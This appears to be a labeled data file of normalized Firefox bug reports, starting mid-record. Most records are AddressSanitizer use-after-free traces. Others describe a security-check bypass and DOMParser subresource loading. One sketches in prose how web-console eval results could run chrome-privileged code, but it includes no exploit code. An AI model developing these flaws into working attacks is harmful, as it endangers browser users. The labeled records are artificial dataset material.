xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjsclass.cpp:1471 60 in nsxpcwrappedjs callmethod unsigned short xptmethoddescriptor const nsxptcminivariant js/xpconnect/src/xpcwrappedjs.cpp:580 61 in prepareanddispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:121 62 in sharedstub xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:0 63 in ns_invokebyindex_p xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 stats 146m malloced 161m for red zones by 349338 calls stats 41m realloced by 19068 calls stats 109m freed by 225400 calls stats 0m really freed by 0 calls stats 340m 87088 full pages mmaped in 85 calls mmaps by size class 8:278511 9:49146 10:20475 11:18423 12:3072 13:2048 14:1536 15:384 16:576 17:128 18:160 19:40 20:16 mallocs by size class 8:264631 9:45378 10:16372 11:16361 12:2245 13:1771 14:1409 15:325 16:527 17:113 18:153 19:40 20:13 frees by size class 8:159416 9:35324 10:13021 11:13202 12:1408 13:876 14:1217 15:274 16:457 17:99 18:58 19:38 20:10 rfrees by size class stats malloc large 319 small slow 1810	11
heap-use-after-free in gfxtextrun canbreaklinebefore reproduces on 20120627175514 crash and free stacks look different from 22134 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in gfxtextrun canbreaklinebefore unsigned int firefox/src/modules/zlib/src/inffast.c:0 1 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:6644 2 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata firefox/src/layout/generic/nstextframethebes.cpp:6746 3 in nsblockframe getminwidth nsrenderingcontext firefox/src/layout/generic/nsblockframe.cpp:754 4 in nsframe shrinkwidthtofit nsrenderingcontext int firefox/src/layout/generic/nsframe.cpp:3935 5 in nscontainerframe computeautosize nsrenderingcontext nssize int nssize nssize nssize bool firefox/src/layout/generic/nscontainerframe.cpp:860 6 in nsframe computesize nsrenderingcontext nssize int nssize nssize nssize unsigned int firefox/src/layout/generic/nsframe.cpp:3780 7 in floatmarginwidth nshtmlreflowstate const int nsiframe nscssoffsetstate const firefox/src/layout/generic/nsblockreflowstate.cpp:562 8 in nsblockreflowstate flowandplacefloat nsiframe firefox/src/layout/generic/nsblockreflowstate.cpp:608 9 in nsblockreflowstate addfloat nslinelayout nsiframe int firefox/src/layout/generic/nsblockreflowstate.cpp:503 10 in nslinelayout addfloat nsiframe int firefox/src/layout/generic/nslinelayout.h:195 11 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:868 12 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus firefox/src/layout/generic/nsblockframe.cpp:3834 13 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool firefox/src/layout/generic/nsblockframe.cpp:3630 14 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:3482 15 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool firefox/src/layout/generic/nsblockframe.cpp:2570 16 in nsblockframe reflowdirtylines nsblockreflowstate firefox/src/layout/generic/nsblockframe.cpp:2020 17 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsblockframe.cpp:1069 18 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 19 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nscanvasframe.cpp:429 20 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 21 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool firefox/src/layout/generic/nsgfxscrollframe.cpp:517 22 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const firefox/src/layout/generic/nsgfxscrollframe.cpp:617 23 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsgfxscrollframe.cpp:858 24 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker firefox/src/layout/generic/nscontainerframe.cpp:906 25 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int firefox/src/layout/generic/nsviewportframe.cpp:200 26 in presshell doreflow nsiframe bool firefox/src/layout/base/nspresshell.cpp:7383 27 in presshell processreflowcommands bool firefox/src/layout/base/nspresshell.cpp:7524 28 in presshell flushpendingnotifications mozflushtype firefox/src/layout/base/nspresshell.cpp:3852 29 in nsdocument flushpendingnotifications mozflushtype firefox/src/content/base/src/nsdocument.cpp:6296 30 in nsglobalwindow flushpendingnotifications mozflushtype firefox/src/dom/base/nsglobalwindow.cpp:9763 31 in nsglobalwindow scrollby int int firefox/src/dom/base/nsglobalwindow.cpp:5452 32 in ns_invokebyindex_p firefox/src/xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:161 33 in callmethodhelper call firefox/src/js/xpconnect/src/xpcwrappednative.cpp:2405 34 in xpc_wn_callmethod jscontext unsigned int js value firefox/src/js/xpconnect/src/xpcwrappednativejsops.cpp:1474 35 in js calljsnative jscontext int jscontext unsigned int js value js callargs const firefox/src/js/src/jscntxtinlines.h:400 36 in js interpret jscontext js stackframe js interpmode firefox/src/js/src/jsinterp.cpp:2437 37 in js runscript jscontext jsscript js stackframe firefox/src/js/src/jsinterp.cpp:267 38 in js executekernel jscontext jsscript jsobject js value const js executetype js stackframe js value firefox/src/js/src/jsinterp.cpp:455 39 in js execute jscontext jsscript jsobject js value firefox/src/js/src/jsinterp.cpp:492 40 in evaluateucscriptforprincipalscommon jscontext jsobject jsprincipals jsprincipals unsigned short const unsigned int char const unsigned int js value jsversion firefox/src/js/src/jsapi.cpp:5371 41 in js_evaluateucscriptforprincipalsversionorigin firefox/src/js/src/jsapi.cpp:5408 42 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool firefox/src/dom/base/nsjsenvironment.cpp:1463 43 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext firefox/src/dom/base/nsglobalwindow.cpp:9057 44 in nsglobalwindow runtimeout nstimeout firefox/src/dom/base/nsglobalwindow.cpp:9321 45 in nsglobalwindow timercallback nsitimer void firefox/src/dom/base/nsglobalwindow.cpp:9593 46 in nstimerimpl fire firefox/src/xpcom/threads/nstimerimpl.cpp:474 47 in nstimerevent run firefox/src/xpcom/threads/nstimerimpl.cpp:558 48 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 49 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 50 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 51 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 52 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 53 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 54 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 55 in nsappstartup run firefox/src/toolkit/components/startup/nsappstartup.cpp:256 56 in xremain xre_mainrun firefox/src/toolkit/xre/nsapprunner.cpp:3786 57 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3863 58 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3939 59 in do_main int char firefox/src/browser/app/nsbrowserapp.cpp:160 60 in main firefox/src/browser/app/nsbrowserapp.cpp:330 61 in 0 is located 8 bytes inside of 580-byte region freed by thread t0 here 0 in free 0 1 in moz_free firefox/src/memory/mozalloc/mozalloc.cpp:49 2 in gfxtextrun operator delete void firefox/src/gfx/thebes/gfxfont.h:2335 3 in gfxtextrun firefox/src/gfx/thebes/gfxfont.cpp:4344 4 in nstextframe cleartextrun nstextframe nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:4263 5 in buildtextrunsscanner assigntextrun gfxtextrun float firefox/src/layout/generic/nstextframethebes.cpp:2359 6 in buildtextrunsscanner buildtextrunforframes void firefox/src/layout/generic/nstextframethebes.cpp:2021 7 in buildtextrunsscanner flushframes bool bool firefox/src/layout/generic/nstextframethebes.cpp:1372 8 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:1301 9 in nstextframe ensuretextrun nstextframe textruntype gfxcontext nsiframe nslinelist_iterator const unsigned int firefox/src/layout/generic/nstextframethebes.cpp:2391 10 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:6594 11 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata firefox/src/layout/generic/nstextframethebes.cpp:6746 12 in nscontainerframe doinlineintrinsicwidth nsrenderingcontext nsiframe inlineintrinsicwidthdata nslayoututils intrinsicwidthtype firefox/src/layout/generic/nscontainerframe.cpp:813 13 in nsfirstletterframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata firefox/src/layout/generic/nsfirstletterframe.cpp:122 14 in nslayoututils minwidthfrominline nsiframe nsrenderingcontext firefox/src/layout/base/nslayoututils.cpp:3009 15 in nsfirstletterframe getminwidth nsrenderingcontext firefox/src/layout/generic/nsfirstletterframe.cpp:137 16 in nslayoututils intrinsicforcontainer nsrenderingcontext nsiframe nslayoututils intrinsicwidthtype firefox/src/layout/base/nslayoututils.cpp:2441 17 in nsiframe inlineminwidthdata forcebreak nsrenderingcontext firefox/src/layout/generic/nsframe.cpp:3597 18 in nsiframe inlineminwidthdata optionallybreak nsrenderingcontext int firefox/src/layout/generic/nsframe.cpp:3622 19 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:6698 20 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata firefox/src/layout/generic/nstextframethebes.cpp:6746 21 in nsblockframe getminwidth nsrenderingcontext firefox/src/layout/generic/nsblockframe.cpp:754 22 in nsframe shrinkwidthtofit nsrenderingcontext int firefox/src/layout/generic/nsframe.cpp:3935 23 in nscontainerframe computeautosize nsrenderingcontext nssize int nssize nssize nssize bool firefox/src/layout/generic/nscontainerframe.cpp:860 24 in nsframe computesize nsrenderingcontext nssize int nssize nssize nssize unsigned int firefox/src/layout/generic/nsframe.cpp:3780 25 in floatmarginwidth nshtmlreflowstate const int nsiframe nscssoffsetstate const firefox/src/layout/generic/nsblockreflowstate.cpp:562 26 in nsblockreflowstate flowandplacefloat nsiframe firefox/src/layout/generic/nsblockreflowstate.cpp:608 27 in nsblockreflowstate addfloat nslinelayout nsiframe int firefox/src/layout/generic/nsblockreflowstate.cpp:503 28 in nslinelayout addfloat nsiframe int firefox/src/layout/generic/nslinelayout.h:195 29 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:868 previously allocated by thread t0 here 0 in malloc 0 1 in moz_malloc firefox/src/memory/mozalloc/mozalloc.cpp:64 2 in gfxtextrun allocatestoragefortextrun unsigned long unsigned int firefox/src/gfx/thebes/gfxfont.cpp:4283 3 in gfxtextrun create gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int firefox/src/gfx/thebes/gfxfont.cpp:4300 4 in gfxfontgroup maketextrun unsigned char const unsigned int gfxtextrunfactory parameters const unsigned int firefox/src/gfx/thebes/gfxfont.cpp:3367 5 in gfxtextrun maketextrun unsigned char unsigned char const unsigned int gfxfontgroup gfxtextrunfactory parameters const unsigned int firefox/src/layout/generic/nstextframethebes.cpp:533 6 in buildtextrunsscanner buildtextrunforframes void firefox/src/layout/generic/nstextframethebes.cpp:1981 7 in buildtextrunsscanner flushframes bool bool firefox/src/layout/generic/nstextframethebes.cpp:1372 8 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:1301 9 in nstextframe ensuretextrun nstextframe textruntype gfxcontext nsiframe nslinelist_iterator const unsigned int firefox/src/layout/generic/nstextframethebes.cpp:2391 10 in nstextframe addinlineminwidthforflow nsrenderingcontext nsiframe inlineminwidthdata nstextframe textruntype firefox/src/layout/generic/nstextframethebes.cpp:6594 11 in nstextframe addinlineminwidth nsrenderingcontext nsiframe inlineminwidthdata firefox/src/layout/generic/nstextframethebes.cpp:6746 12 in nsblockframe getminwidth nsrenderingcontext firefox/src/layout/generic/nsblockframe.cpp:754 13 in nsframe shrinkwidthtofit nsrenderingcontext int firefox/src/layout/generic/nsframe.cpp:3935 14 in nscontainerframe computeautosize nsrenderingcontext nssize int nssize nssize nssize bool firefox/src/layout/generic/nscontainerframe.cpp:860 15 in nsframe computesize nsrenderingcontext nssize int nssize nssize nssize unsigned int firefox/src/layout/generic/nsframe.cpp:3780 16 in floatmarginwidth nshtmlreflowstate const int nsiframe nscssoffsetstate const firefox/src/layout/generic/nsblockreflowstate.cpp:562 17 in nsblockreflowstate flowandplacefloat nsiframe firefox/src/layout/generic/nsblockreflowstate.cpp:608 18 in nsblockreflowstate addfloat nslinelayout nsiframe int firefox/src/layout/generic/nsblockreflowstate.cpp:503 19 in nslinelayout addfloat nsiframe int firefox/src/layout/generic/nslinelayout.h:195 20 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool firefox/src/layout/generic/nslinelayout.cpp:868 21 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus firefox/src/layout/generic/nsblockframe.cpp:3834 22 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool firefox/src/layout/generic/nsblockframe.cpp:3630 22134 aborting stats 150m malloced 164m for red zones by 352192 calls stats 41m realloced by 18995 calls stats 110m freed by 224892 calls stats 0m really freed by 0 calls stats 344m 88113 full pages mmaped in 86 calls mmaps by size class 8:278511 9:49146 10:20475 11:18423 12:3072 13:2048 14:1536 15:384 16:576 17:128 18:176 19:40 20:16 mallocs by size class 8:265920 9:46521 10:16109 11:16839 12:2376 13:1812 14:1414 15:336 16:532 17:113 18:167 19:40 20:13 frees by size class 8:158005 9:35984 10:12721 11:13639 12:1450 13:917 14:1225 15:282 16:464 17:99 18:58 19:38 20:10 rfrees by size class stats malloc large 333 small slow 1835 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
bypassing security checks for nslocation checkurl getcontextfromstack ignores jscontext for contentframemessagemanager if getcontextfromstack ends up not getting a jscontext nslocation checkurl does not do security checks this could allow content to load restricted urls	9
domparser does subresource loads when used from privileged code if domparser parses html string to dom should not it omit not only script processing but also recourse loading as the pure xhr does with responsetype document i run this code from javascript editor scratchpad in browser context var parser new domparser var xhr new xmlhttprequest xhr.mozbackgroundrequest true xhr.open get true xhr.timeout 10000 xhr.channel.loadflags components.interfaces.nsirequest.load_bypass_cache xhr.onload function var doc parser.parsefromstring this.responsetext text/html var title doc.evaluate title doc null xpathresult.first_ordered_node_type null singlenodevalue if title alert title.textcontent else alert parsing error xhr.ontimeout function alert timeout xhr.onerror function alert http error xhr.send null httpfox shows additional recourse loading here some http logs for three sites started time sent received method result type url 00:00:01.221 1.197 603 316 get 200 text/html 00:00:02.492 0.171 332 34312 get cache text/css 00:00:02.548 0.143 321 824 get cache text/css 00:00:02.618 0.464 968 201 get 303 redirect to dcso6de4r0000082npfcmh4rf_4b1e/njs.gif dcsredirect=108 dcstlh=1298194945 dcstlv=1298194945 dcsuri=/nojavascript wt.js=no wt.tv=8.6.2 00:00:03.383 0.622 1050 327 get 200 image/gif 00:00:02.218 0.163 893 6678 get 200 text/html 00:00:02.470 0.582 844 21059 get 200 text/css 00:00:02.527 0.487 859 8094 get 200 image/png 00:00:02.581 0.461 864 613 get 200 image/gif 00:00:02.639 0.377 865 613 get 200 image/gif 00:00:02.698 0.112 853 165 get cache image/gif 00:00:02.756 0.324 352 231 get 200 image/gif 00:00:18.897 0.283 1433 243 get 200 text/html 00:00:19.236 0.339 335 28286 get cache text/css 00:00:19.290 0.448 597 188 get 302 redirect to 00:00:19.344 0.261 346 96 get cache text/css 00:00:19.396 0.340 582 188 get 302 redirect to 00:00:19.449 0.288 580 188 get 302 redirect to 00:00:19.504 0.146 425 220 get 200 image/gif 00:00:19.899 0.418 328 43 get cache image/gif 00:00:19.957 0.362 328 43 get cache image/gif 00:00:20.015 0.305 328 43 get cache image/gif why domparser needs these files for just dom parsing	11
console eval results capable of executing chrome-privileged code current release and beta builds vulnerable 13 and 14 1 open the attached poc 2 in the web console inspect the paragraph element document.getelementbyid p hudservice.jsm plays it loose with wrapperless eval results jst_execute passes the eval result into formatresult which allows the content-supplied object to override tosource or tostring to return whatever it likes from there it hits writeoutputjs and createmessagenode side note for fun starting with writeoutputjs follow the call graph and check out all the places the unsafe aoutputobject can visit 5059 if the tosource/tostring override returned a dom node that node eventually gets inserted into the browser.xul document from there we can do the ol exploit on event attributes to run with chrome privileges plausible attack take something interesting like a prouget demo and insert a variation of this exploit use proxies those are available to content right to ensure that virtually any expression that the user enters will result in an object with a malicious tosource/tostring this poc does n't work with aurora and nightly builds due to the async console split bug 673148 and further changes it s possible that hudservice-content.js is vulnerable though i simply have n't looked into it sorry for the drive-by and hurried comment it s late and i have early morning obligations	5
heap-use-after-free in rangedata rangedata reproduces on trunk 20120707214206 25564 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nsrefptr firefox/src dist/include/nsautoptr.h:874 1 in nsrefptr firefox/src dist/include/nsautoptr.h:875 2 in rangedata rangedata firefox/src dist/include/mozilla/selection.h:24 3 in rangedata rangedata firefox/src dist/include/mozilla/selection.h:24 4 in nstarrayelementtraits rangedata destruct rangedata firefox/src dist/include/nstarray.h:349 5 in nstarray rangedata nstarraydefaultallocator destructrange unsigned int unsigned int firefox/src dist/include/nstarray.h:1210 6 in nstarray rangedata nstarraydefaultallocator removeelementsat unsigned int unsigned int firefox/src dist/include/nstarray.h:932 7 in mozilla selection additem nsrange int firefox/src/layout/generic/nsselection.cpp:3535 8 in mozilla selection addrange nsidomrange firefox/src/layout/generic/nsselection.cpp:4414 9 in mozinlinespellchecker addrange nsiselection nsidomrange firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1600 10 in mozinlinespellchecker dospellcheck mozinlinespellwordutil nsiselection mozinlinespellstatus bool firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1399 11 in mozinlinespellchecker resumecheck mozinlinespellstatus firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1488 12 in mozinlinespellresume run firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:462 13 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 14 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 15 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 16 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 17 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 18 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 19 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 20 in nsappstartup run firefox/src/toolkit/components/startup/nsappstartup.cpp:257 21 in xremain xre_mainrun firefox/src/toolkit/xre/nsapprunner.cpp:3787 22 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3864 23 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3940 24 in do_main int char firefox/src/browser/app/nsbrowserapp.cpp:160 25 in main firefox/src/browser/app/nsbrowserapp.cpp:330 26 in 0 is located 0 bytes inside of 64-byte region freed by thread t0 here 0 in free 0 1 in moz_free firefox/src/memory/mozalloc/mozalloc.cpp:49 2 in nsrange firefox/src/content/base/src/nsrange.cpp:215 3 in nsrange release firefox/src/content/base/src/nsrange.cpp:258 4 in nsrefptr firefox/src dist/include/nsautoptr.h:874 5 in nsrefptr firefox/src dist/include/nsautoptr.h:875 6 in rangedata rangedata firefox/src dist/include/mozilla/selection.h:24 7 in rangedata rangedata firefox/src dist/include/mozilla/selection.h:24 8 in nstarrayelementtraits rangedata destruct rangedata firefox/src dist/include/nstarray.h:349 9 in nstarray rangedata nstarraydefaultallocator destructrange unsigned int unsigned int firefox/src dist/include/nstarray.h:1210 10 in nstarray rangedata nstarraydefaultallocator removeelementsat unsigned int unsigned int firefox/src dist/include/nstarray.h:932 11 in mozilla selection additem nsrange int firefox/src/layout/generic/nsselection.cpp:3535 12 in mozilla selection addrange nsidomrange firefox/src/layout/generic/nsselection.cpp:4414 13 in mozinlinespellchecker addrange nsiselection nsidomrange firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1600 14 in mozinlinespellchecker dospellcheck mozinlinespellwordutil nsiselection mozinlinespellstatus bool firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1399 15 in mozinlinespellchecker resumecheck mozinlinespellstatus firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1488 16 in mozinlinespellresume run firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:462 17 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 18 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 19 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 20 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 21 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 22 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 23 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 24 in nsappstartup run firefox/src/toolkit/components/startup/nsappstartup.cpp:257 25 in xremain xre_mainrun firefox/src/toolkit/xre/nsapprunner.cpp:3787 26 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3864 27 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3940 28 in do_main int char firefox/src/browser/app/nsbrowserapp.cpp:160 29 in main firefox/src/browser/app/nsbrowserapp.cpp:330 previously allocated by thread t0 here 0 in interceptor_malloc 0 1 in moz_xmalloc firefox/src/memory/mozalloc/mozalloc.cpp:54 2 in mozinlinespellwordutil makerange mozinlinespellwordutil nodeoffset mozinlinespellwordutil nodeoffset nsrange firefox/src/extensions/spellcheck/src/mozinlinespellwordutil.cpp:322 3 in mozinlinespellwordutil makerangeforword mozinlinespellwordutil realword const nsrange firefox/src/extensions/spellcheck/src/mozinlinespellwordutil.cpp:226 4 in mozinlinespellwordutil getnextword nsastring_internal nsrange bool firefox/src/extensions/spellcheck/src/mozinlinespellwordutil.cpp:297 5 in mozinlinespellchecker dospellcheck mozinlinespellwordutil nsiselection mozinlinespellstatus bool firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1317 6 in mozinlinespellchecker resumecheck mozinlinespellstatus firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:1488 7 in mozinlinespellresume run firefox/src/extensions/spellcheck/src/mozinlinespellchecker.cpp:462 8 in nsthread processnextevent bool bool firefox/src/xpcom/threads/nsthread.cpp:625 9 in ns_processnextevent_p nsithread bool firefox/src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:217 10 in mozilla ipc messagepump run base messagepump delegate firefox/src/ipc/glue/messagepump.cpp:82 11 in messageloop runinternal firefox/src/ipc/chromium/src/base/message_loop.cc:209 12 in messageloop runhandler firefox/src/ipc/chromium/src/base/message_loop.cc:202 13 in messageloop run firefox/src/ipc/chromium/src/base/message_loop.cc:176 14 in nsbaseappshell run firefox/src/widget/xpwidgets/nsbaseappshell.cpp:165 15 in nsappstartup run firefox/src/toolkit/components/startup/nsappstartup.cpp:257 16 in xremain xre_mainrun firefox/src/toolkit/xre/nsapprunner.cpp:3787 17 in xremain xre_main int char nsxreappdata const firefox/src/toolkit/xre/nsapprunner.cpp:3864 18 in xre_main firefox/src/toolkit/xre/nsapprunner.cpp:3940 19 in do_main int char firefox/src/browser/app/nsbrowserapp.cpp:160 20 in main firefox/src/browser/app/nsbrowserapp.cpp:330 21 in 0 25564 aborting stats 156m malloced 189m for red zones by 464984 calls stats 41m realloced by 20345 calls stats 112m freed by 231687 calls stats 0m really freed by 0 calls stats 376m 96306 full pages mmaped in 94 calls mmaps by size class 8:393192 9:49146 10:20475 11:18423 12:3072 13:2048 14:1536 15:384 16:576 17:128 18:176 19:48 20:16 mallocs by size class 8:376983 9:47309 10:16409 11:17335 12:2458 13:1841 14:1416 15:336 16:562 17:116 18:165 19:41 20:13 frees by size class 8:163249 9:36760 10:12958 11:14054 12:1531 13:948 14:1228 15:278 16:474 17:101 18:58 19:38 20:10 rfrees by size class stats malloc large 335 small slow 2084 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd	11
heap-use-after-free in mozspellchecker setcurrentdictionary reproduced on trunk it was n't a reliable crash will update bug if i get a reliable testcase looks like this mozspellchecker is blown from underneath see free stack and then causes a crash on reading its member variable here 357 mspellcheckingengine setpersonaldictionary personaldictionary.get 20120707214206 7193 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in mozspellchecker setcurrentdictionary nsastring_internal const extensions/spellcheck/src/mozspellchecker.cpp:357 1 in nseditorspellcheck setcurrentdictionary nsastring_internal const editor/composer/src/nseditorspellcheck.cpp:523 2 in nseditorspellcheck updatecurrentdictionary editor/composer/src/nseditorspellcheck.cpp:651 3 in mozinlinespellchecker updatecurrentdictionary extensions/spellcheck/src/mozinlinespellchecker.cpp:1783 4 in nseditoreventlistener focus nsidomevent editor/libeditor/base/nseditoreventlistener.cpp:888 5 in nseditoreventlistener handleevent nsidomevent editor/libeditor/base/nseditoreventlistener.cpp:311 6 in nsrefptr nsidomeventlistener operator nsidomeventlistener const content/events/src/nseventlistenermanager.cpp:818 7 in nseventtargetchainitem handleevent nseventchainpostvisitor unsigned int bool nscxpusher content/events/src/nseventlistenermanager.h:143 is located 40 bytes inside of 56-byte region freed by thread t0 here 0 in free 1 in mozspellchecker release extensions/spellcheck/src/mozspellchecker.cpp:16 2 in nscomptr nsiinlinespellchecker nscomptr dist/include/nscomptr.h:442 3 in non-virtual thunk to nseditor observe nsisupports char const unsigned short const dist/include/nscomptr.h:757 4 in nsthashtable nsobserverlist getentry char const const dist/include/nsthashtable.h:147 previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 7193 aborting stats 186m malloced 225m for red zones by 546881 calls stats 36m realloced by 21270 calls stats 147m freed by 250321 calls stats 13m really freed by 49274 calls stats 420m 107580 full pages mmaped in 105 calls mmaps by size class 8:425958 9:57337 10:20475 11:14329 12:5120 13:3072 14:1792 15:512 16:704 17:128 18:224 19:40 20:16 mallocs by size class 8:448516 9:54348 10:19102 11:14230 12:4418 13:2919 14:1824 15:407 16:723 17:119 18:221 19:41 20:13 frees by size class 8:177903 9:37821 10:14745 11:11000 12:3384 13:2594 14:1557 15:344 16:652 17:98 18:173 19:39 20:11 rfrees by size class 8:42301 9:3888 10:1120 11:1186 12:273 13:185 14:128 15:52 16:129 17:7 18:4 19:1 stats malloc large 394 small slow 2548 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00	11
